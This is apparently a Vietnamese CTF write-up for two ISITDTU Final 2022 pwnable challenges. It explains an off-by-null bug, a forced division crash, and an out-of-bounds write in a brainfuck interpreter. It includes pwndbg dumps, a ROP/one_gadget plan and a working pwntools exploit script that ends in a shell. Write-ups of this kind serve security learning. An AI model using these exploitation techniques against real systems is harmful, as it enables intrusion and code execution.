---
layout: post
title:  "ISITDTU Final 2022 Pwnable Writeup"
categories: tools
tags: codeql tutorial
author: th3_5had0w@Sarmat
mathjax: true
---

* content
{:toc}

Writeup ezMisc và ezPwn giải ISITDTU Final 2022




# ezMisc

Nhìn vào hàm main có thể thấy:

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  __int64 result; // rax
  __WAIT_STATUS stat_loc; // [rsp+8h] [rbp-18h] BYREF
  _DWORD *v5; // [rsp+10h] [rbp-10h]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  alarm(0x3Cu);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  v5 = mmap(0LL, 0x108uLL, 3, 33, -1, 0LL);
  if ( v5 )
  {
    v5[64] = 1;
    while ( !v5[65] )
    {
      HIDWORD(stat_loc.__iptr) = fork();
      if ( !HIDWORD(stat_loc.__iptr) )
        return mainloop((__int64)v5); // đã được đổi tên
      wait((__WAIT_STATUS)&stat_loc);
    }
    result = 0LL;
  }
  else
  {
    perror("mmap");
    result = 1LL;
  }
  return result;
}
```

- Chương trình cho ta một vùng bộ nhớ được mmap được gán cho v5

- `v5[64]` được set giá trị 1.

- Có một vòng lặp với điều kiện `v5[65] == 0` (cho đến hiện tại thì điều kiện này luôn đúng) trong đó:

    * spawn ra một child process bằng fork(), process con đó sẽ thực thi hàm mà mình sẽ tạm gọi là mainloop()

    * parent process sẽ đợi đến khi child process kết thúc vòng đời.

Xem thử nội dung của mainloop:

```c
__int64 __fastcall mainloop(__int64 a1)
{
  int v1; // eax

  while ( !*(_DWORD *)(a1 + 260) )
  {
    loop_init_func(a1); // đã được đổi tên
    menu(); // đã được đổi tên
    v1 = read_int(); // đã được đổi tên
    if ( v1 == 3 )
    {
      option_3(a1); // đã được đổi tên
    }
    else
    {
      if ( v1 > 3 )
        goto LABEL_10;
      if ( v1 == 1 )
      {
        option_1(a1); // đã được đổi tên
      }
      else if ( v1 == 2 )
      {
        option_2(a1); // đã được đổi tên
      }
      else
      {
LABEL_10:
        puts("Invalid choice");
      }
    }
  }
  return 0LL;
}
```

- Vòng lặp có điều kiện `*(a1+260)==0`, điều kiện này tương đương với `v5[65] == 0`.

- Hàm loop_init_func:

    ```c
    void *__fastcall loop_init_func(void *a1)
    {
    if ( !dword_4840 )
    {
        memcpy(&unk_4860, a1, 0x108uLL);
        dword_4840 = 1;
    }
    return memcpy(a1, &unk_4860, 0x108uLL);
    }
    ```

    * Lần chạy đầu tiên: copy `0x108` byte data từ `a1` vào vùng bộ nhớ `unk_4860` rồi copy ngược lại từ vùng bộ nhớ `unk_4860` vào `a1` - chức năng là để lưu giữ trạng thái của `a1` trước khi bắt đầu chạy các chương trình khác.

    * Những lần chạy sau: copy `0x108` byte data từ vùng bộ nhớ `unk_4860` vào `a1` - chức năng là để reset lại trạng thái của `a1` về trạng thái gốc.

- Chương trình cho ta 3 option, nhưng hiện tại chỉ sử dụng được option 1, vì option 2 và option 3 cần phải thỏa mãn điều kiện `*(a1+256)==0` thì ta mới có quyền sử dụng.

Option 1 hiện tại là option duy nhất mà ta access được, vậy ta sẽ xem nó làm gì trước.

```c
int __fastcall option_1(char *a1)
{
  const char *v1; // rax
  unsigned int v3; // [rsp+1Ch] [rbp-14h]
  int i; // [rsp+20h] [rbp-10h]
  int v5; // [rsp+24h] [rbp-Ch]
  int v6; // [rsp+28h] [rbp-8h]
  int v7; // [rsp+2Ch] [rbp-4h]

  v3 = 0;
  *a1 = 0;
  printf("Enter your string: ");
  v1 = (const char *)((__int64 (*)(void))((char *)&sub_1348 + 1))(); // hàm để đọc input
  strncat(a1, v1, 0x100uLL);
  v5 = strlen(a1);
  printf("Enter first magic number: ");
  v6 = read_int();
  printf("Enter second magic number: ");
  v7 = read_int();
  if ( !v7 )
    return puts("Second magic number cannot be zero!");
  for ( i = 0; i < v5; ++i )
    v3 = ((int)(v6 * v3) % v7 + v6 * a1[i] % v7) % v7;
  return printf("Your score: %d\n", v3);
}
```

Kiểm tra hàm mình tạm đặt là option_1:

- `((char *)&sub_1348 + 1))();` là call đến hàm mình tạm đặt là read_data, hàm read_data đọc `0x7ff` byte bắt đầu từ vùng bộ nhớ `byte_4040`

```c
_BYTE *read_data()
{
  unsigned int i; // [rsp-Ch] [rbp-Ch]

  for ( i = 0; i <= 0x7FE; ++i )
  {
    if ( read(0, &byte_4040[i], 1uLL) != 1 )
    {
      perror("read");
      exit(1);
    }
    if ( byte_4040[i] == 10 )
      break;
  }
  byte_4040[i] = 0;
  return byte_4040;
}
```

- Ta thấy có bug off-by-null xuất hiện tại `strncat(a1, v1, 0x100uLL);`, khi `strncat` sử dụng `0x100` byte thì sẽ append thêm một null-byte vào cuối, như vậy `*(a1+256)` hay `v5[64]` lúc này sẽ bị null-byte overwrite và mang giá trị là 0 chứ không phải là 1 như ban đầu nữa. Như vậy là ta sẽ có thể sử dụng `option_2` và `option_3`?

Hãy nhớ lại hàm `loop_init_func` vào lần chạy đầu tiên đã lưu lại trạng thái gốc của `a1`, bây giờ sau khi return từ hàm option_1 thì `loop_init_func` sẽ reset lại trạng thái của `a1` về trạng thái gốc, và bug off-by-null của ta sẽ trở nên vô dụng. Vậy ta phải gây crash child process ngay trong hàm `option_1` để chương trình fork() lại một process con mới và khi đó `loop_init_func` khi chạy lần đầu tiên sẽ lưu lại trạng thái `a1` mà ta đã chỉnh sửa bằng bug off-by-null.

Vậy bây giờ phải tìm cách gây crash child process ngay trong hàm `option_1`.

```c
for ( i = 0; i < v5; ++i )
    v3 = ((int)(v6 * v3) % v7 + v6 * a1[i] % v7) % v7;
```

Để ý tại đây thì chương trình có sử dụng các phép modulo (idiv instruction) và ta kiểm soát được các parameter `v6`, `v7` và `a1[i]`. Mình set giá trị của các tham số sao cho phương trình trên có dạng kết quả là `-2147483648 % -1`. Khi đó sẽ xảy ra [arithmetic exception](https://stackoverflow.com/questions/14097924/arithmetic-exception-in-gdb-but-im-not-dividing-by-zero), cũng là một loại gây ra fault khiến child process crash. Và bây giờ ta đã có thể sử dụng `option_2` và `option_3`.

P/s: ban đầu không để ý đến phương trình trên khiến mình cứ tìm cách gửi ctrl-D qua để trong hàm `read_data` gọi `exit`, nhưng thất bại toàn tập =))

`option_2` là để in flag của ezMisc.

# ezPwn

Tiếp đến với ezPwn, sau khi đã unlock được chức năng `option_3`.

```c
unsigned __int64 __fastcall option_3(__int64 a1)
{
  int v1; // eax
  int v3; // [rsp+14h] [rbp-ACh]
  _BYTE *i; // [rsp+18h] [rbp-A8h]
  _BYTE *j; // [rsp+20h] [rbp-A0h]
  __int64 v6; // [rsp+28h] [rbp-98h]
  char s[136]; // [rsp+30h] [rbp-90h] BYREF
  unsigned __int64 v8; // [rsp+B8h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  v3 = 0;
  if ( *(_DWORD *)(a1 + 256) )
  {
    puts("Access denied");
  }
  else
  {
    *(_DWORD *)(a1 + 260) = 1;
    memset(s, 0, 0x80uLL);
    printf("Enter source code: ");
    v6 = ((__int64 (*)(void))((char *)&sub_1348 + 1))();
    for ( i = (_BYTE *)v6; *i; ++i )
    {
      if ( *i != 60 && *i != 62 && *i != 43 && *i != 45 )
      {
        puts("Invalid program");
        return v8 - __readfsqword(0x28u);
      }
    }
    for ( j = (_BYTE *)v6; *j; ++j )
    {
      v1 = (char)*j;
      if ( v1 == 62 )
      {
        ++v3;
      }
      else if ( v1 <= 62 )
      {
        if ( v1 == 60 )
        {
          --v3;
        }
        else if ( v1 <= 60 )
        {
          if ( v1 == 43 )
          {
            ++s[v3];
          }
          else if ( v1 == 45 )
          {
            --s[v3];
          }
        }
      }
    }
  }
  return v8 - __readfsqword(0x28u);
}
```

Nhìn sơ qua thì nhận ra đây là brainfuck interpreter, nhưng bị bug OOB khá lộ liễu. Vậy mình chỉ cần sửa lại return address đến tạo thành ROPchain. Vấn đề ở đây chỉ là tìm gadget nào cho đúng để sử dụng, vì chương trình có PIE và Libc hiện tại cũng chưa được leak.

```
Thread 2.1 "game" hit Breakpoint 2, 0x0000561ea7c7072c in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────
*RAX  0x0
 RBX  0x0
*RCX  0x7f4bd080f992 (read+18) ◂— cmp    rax, -0x1000 /* 'H=' */
*RDX  0x561ea7c73040 ◂— '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
*RDI  0x0
*RSI  0x561ea7c730d8 ◂— 0x0
*R8   0x13
 R9   0x0
*R10  0x561ea7c710a4 ◂— 'Enter source code: '
*R11  0x246
 R12  0x7ffc272461a8 —▸ 0x7ffc27247284 ◂— 0x5300656d61672f2e /* './game' */
 R13  0x561ea7c7086d ◂— endbr64 
 R14  0x561ea7c72d40 —▸ 0x561ea7c70300 ◂— endbr64 
 R15  0x7f4bd0973040 (_rtld_global) —▸ 0x7f4bd09742e0 —▸ 0x561ea7c6f000 ◂— 0x10102464c457f
*RBP  0x7ffc27246060 —▸ 0x7ffc27246090 ◂— 0x1
*RSP  0x7ffc27246048 —▸ 0x561ea7c70846 ◂— jmp    0x561ea7c70858
*RIP  0x561ea7c7072c ◂— ret    
──────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────
 ► 0x561ea7c7072c    ret    <0x561ea7c70846>
    ↓
   0x561ea7c70846    jmp    0x561ea7c70858                <0x561ea7c70858>
    ↓
   0x561ea7c70858    mov    rax, qword ptr [rbp - 8]
   0x561ea7c7085c    mov    eax, dword ptr [rax + 0x104]
   0x561ea7c70862    test   eax, eax
   0x561ea7c70864    je     0x561ea7c707e8                <0x561ea7c707e8>
 
   0x561ea7c70866    mov    eax, 0
   0x561ea7c7086b    leave  
   0x561ea7c7086c    ret    
    ↓
   0x561ea7c7092a    jmp    0x561ea7c7094b                <0x561ea7c7094b>
    ↓
   0x561ea7c7094b    mov    rdx, qword ptr [rbp - 8]
──────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────
00:0000│ rsp 0x7ffc27246048 —▸ 0x561ea7c70846 ◂— jmp    0x561ea7c70858
01:0008│     0x7ffc27246050 —▸ 0x7ffc27246090 ◂— 0x1
02:0010│     0x7ffc27246058 —▸ 0x7f4bd0970000 ◂— 0x4141414141414101
03:0018│ rbp 0x7ffc27246060 —▸ 0x7ffc27246090 ◂— 0x1
04:0020│     0x7ffc27246068 —▸ 0x561ea7c7092a ◂— jmp    0x561ea7c7094b
05:0028│     0x7ffc27246070 ◂— 0x0
06:0030│     0x7ffc27246078 ◂— 0x88
07:0038│     0x7ffc27246080 —▸ 0x7f4bd0970000 ◂— 0x4141414141414101
────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────
 ► f 0   0x561ea7c7072c
   f 1   0x561ea7c70846
   f 2   0x561ea7c7092a
   f 3   0x7f4bd0724d90 __libc_start_call_main+128
   f 4   0x7f4bd0724e40 __libc_start_main+128
   f 5   0x561ea7c70285
─────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x561ea7c6f000     0x561ea7c70000 r--p     1000 0      /home/duongnh/Desktop/isitdtu-final-2022/ezpwn/game
    0x561ea7c70000     0x561ea7c71000 r-xp     1000 1000   /home/duongnh/Desktop/isitdtu-final-2022/ezpwn/game
    0x561ea7c71000     0x561ea7c72000 r--p     1000 2000   /home/duongnh/Desktop/isitdtu-final-2022/ezpwn/game
    0x561ea7c72000     0x561ea7c73000 r--p     1000 2000   /home/duongnh/Desktop/isitdtu-final-2022/ezpwn/game
    0x561ea7c73000     0x561ea7c74000 rw-p     1000 3000   /home/duongnh/Desktop/isitdtu-final-2022/ezpwn/game
    0x7f4bd06f8000     0x7f4bd06fb000 rw-p     3000 0      [anon_7f4bd06f8]
    0x7f4bd06fb000     0x7f4bd0723000 r--p    28000 0      /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f4bd0723000     0x7f4bd08b8000 r-xp   195000 28000  /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f4bd08b8000     0x7f4bd0910000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f4bd0910000     0x7f4bd0914000 r--p     4000 214000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f4bd0914000     0x7f4bd0916000 rw-p     2000 218000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f4bd0916000     0x7f4bd0923000 rw-p     d000 0      [anon_7f4bd0916]
    0x7f4bd0937000     0x7f4bd0939000 rw-p     2000 0      [anon_7f4bd0937]
    0x7f4bd0939000     0x7f4bd093b000 r--p     2000 0      /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7f4bd093b000     0x7f4bd0965000 r-xp    2a000 2000   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7f4bd0965000     0x7f4bd0970000 r--p     b000 2c000  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7f4bd0970000     0x7f4bd0971000 rw-p     1000 0      /dev/zero (deleted)
    0x7f4bd0971000     0x7f4bd0973000 r--p     2000 37000  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7f4bd0973000     0x7f4bd0975000 rw-p     2000 39000  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffc27227000     0x7ffc27248000 rw-p    21000 0      [stack]
    0x7ffc27344000     0x7ffc27348000 r--p     4000 0      [vvar]
    0x7ffc27348000     0x7ffc2734a000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]
pwndbg> tele 11
00:0000│ rsp 0x7ffc27246048 —▸ 0x561ea7c70846 ◂— jmp    0x561ea7c70858
01:0008│     0x7ffc27246050 —▸ 0x7ffc27246090 ◂— 0x1
02:0010│     0x7ffc27246058 —▸ 0x7f4bd0970000 ◂— 0x4141414141414101
03:0018│ rbp 0x7ffc27246060 —▸ 0x7ffc27246090 ◂— 0x1
04:0020│     0x7ffc27246068 —▸ 0x561ea7c7092a ◂— jmp    0x561ea7c7094b
05:0028│     0x7ffc27246070 ◂— 0x0
06:0030│     0x7ffc27246078 ◂— 0x88
07:0038│     0x7ffc27246080 —▸ 0x7f4bd0970000 ◂— 0x4141414141414101
08:0040│     0x7ffc27246088 ◂— 0xbce174f9be57d900
09:0048│     0x7ffc27246090 ◂— 0x1
0a:0050│     0x7ffc27246098 —▸ 0x7f4bd0724d90 (__libc_start_call_main+128) ◂— mov    edi, eax
pwndbg>
```

Nhìn vào trạng thái stack ở đây ta có thể thấy tại `0x7ffc27246058` và `0x7ffc27246080` chứa địa chỉ `0x7f4bd0970000`, `0x7f4bd0970000` nằm ở vị trí tuyến tính với địa chỉ của Libc, vì vậy có thể thực hiện các phép cộng trừ "byte-by-byte" để tạo ra các gadget hữu ích, còn địa chỉ `__libc_start_call_main+128` mình sẽ sửa thành one_gadget.

Ở đây thì mình tìm thấy một vài gadget hữu dụng có thể thỏa mãn điều kiện của one_gadget với stack layout hiện tại:

```
0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0x000000000010d56c : pop rcx ; pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret

0x0000000000090529 : pop rdx ; pop rbx ; ret
```

Còn với return address mình sẽ sửa thành gadget `0x0000000000001016 : add rsp, 8 ; ret` để có thể return vào các gadget libc mà mình chuẩn bị sẵn.

Mình khá chắc đây không phải là intended solution. Bởi vì để thực hiện thì cách này có xác suất là 1/? tùy thuộc vào base của libc và base của binary, đôi khi các phép cộng hay trừ sẽ bị nhớ 1 hay trừ một vào đơn vị số liền kề bên trái khiến cho địa chỉ gadget sẽ sai.

Đây là script solve cho 2 bài trên của mình:

```python
from pwn import *

io = process('./game')
#gdb.attach(io, gdbscript='''
#        handle SIGALRM ignore
#        set follow-fork-mode parent
#        b memset
#        ''')
#io = remote('20.121.188.64', 31337)

io.sendline(b'1')
io.sendline(b'\x01'+b'A'*300)
io.sendline(b'-2147483648')
#pause()
io.sendline(b'-1')
io.sendline(b'3')

pl = b'>'*152
pl += b'-'*0x30
pl += b'>'
pl += b'-'*0x8
pl += b'>'*7
pl += b'>'*8

pl += b'-'*0x94
pl += b'>'
pl += b'-'*0x7b
pl += b'>'
pl += b'-'*0x16
pl += b'>'*6

pl += b'+'*0x10
pl += b'>'*8

pl += b'>'*8*3

pl += b'-'*0xd7
pl += b'>'
pl += b'-'*0x4b
pl += b'>'
pl += b'-'*0x1e
pl += b'>'*6

pl += b'>'*8*2

pl += b'-'*0x59
pl += b'>'
pl += b'+'*0x6d
pl += b'>'
pl += b'+'*0x2

io.sendline(pl)
io.interactive()

7528 Sarmat λ  (~/.../isitdtu-final-2022/ezpwn)
 $ python3 exp.py 
[+] Starting local process './game': pid 11330
[*] Switching to interactive mode
1. Play game
2. Read MOTD
3. Some language interpreter
Your choice: Enter your string: Enter first magic number: Enter second magic number: 1. Play game
2. Read MOTD
3. Some language interpreter
Your choice: Enter source code: $ 
$ id
uid=1000(duongnh) gid=1000(duongnh) groups=1000(duongnh),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare),137(docker)
$ 
[*] Interrupted
[*] Stopped process './game' (pid 11330)
```